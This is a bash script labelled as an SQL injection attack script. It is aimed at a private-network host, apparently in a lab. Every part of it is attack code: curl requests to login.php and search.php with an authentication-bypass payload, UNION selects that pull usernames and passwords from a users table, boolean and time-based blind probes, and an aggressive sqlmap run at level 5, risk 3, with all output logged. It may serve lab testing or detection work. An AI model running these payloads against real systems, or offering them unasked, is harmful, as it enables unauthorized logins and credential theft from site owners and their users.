#!/bin/bash

TARGET="http://172.20.0.10"
LOG_FILE="/var/log/attacks/sqli.log"

echo "=== SQL Injection Attack Script ===" | tee -a $LOG_FILE
echo "Target: $TARGET" | tee -a $LOG_FILE
echo "Started: $(date)" | tee -a $LOG_FILE
echo "" | tee -a $LOG_FILE

echo "[*] Test 1: Basic authentication bypass" | tee -a $LOG_FILE
curl -X POST "$TARGET/login.php" \
  -d "username=admin' OR '1'='1'--&password=anything" \
  -L -s -o /dev/null -w "HTTP Status: %{http_code}\n" | tee -a $LOG_FILE
sleep 2

echo "[*] Test 2: UNION-based injection" | tee -a $LOG_FILE
curl -X POST "$TARGET/login.php" \
  -d "username=admin' UNION SELECT null,username,password,null,null FROM users--&password=x" \
  -L -s -o /dev/null -w "HTTP Status: %{http_code}\n" | tee -a $LOG_FILE
sleep 2

echo "[*] Test 3: Boolean-based blind SQLi" | tee -a $LOG_FILE
curl -X POST "$TARGET/login.php" \
  -d "username=admin' AND '1'='1'--&password=x" \
  -L -s -o /dev/null -w "HTTP Status: %{http_code}\n" | tee -a $LOG_FILE
sleep 2

echo "[*] Test 4: Time-based blind SQLi" | tee -a $LOG_FILE
curl -X POST "$TARGET/login.php" \
  -d "username=admin' AND SLEEP(5)--&password=x" \
  -L -s -o /dev/null -w "HTTP Status: %{http_code}\n" | tee -a $LOG_FILE
sleep 2

echo "[*] Test 5: Search functionality SQLi" | tee -a $LOG_FILE
curl -G "$TARGET/search.php" \
  --data-urlencode "search=' UNION SELECT 1,username,password,4 FROM users--" \
  -s -o /dev/null -w "HTTP Status: %{http_code}\n" | tee -a $LOG_FILE

echo "" | tee -a $LOG_FILE
echo "=== Attack completed: $(date) ===" | tee -a $LOG_FILE
echo "" | tee -a $LOG_FILE

echo "[*] Running automated SQLMap scan..." | tee -a $LOG_FILE
sqlmap -u "$TARGET/login.php" \
  --data="username=test&password=test" \
  --batch \
  --level=5 \
  --risk=3 \
  --threads=5 \
  --output-dir="/var/log/attacks/sqlmap" \
  2>&1 | tee -a $LOG_FILE
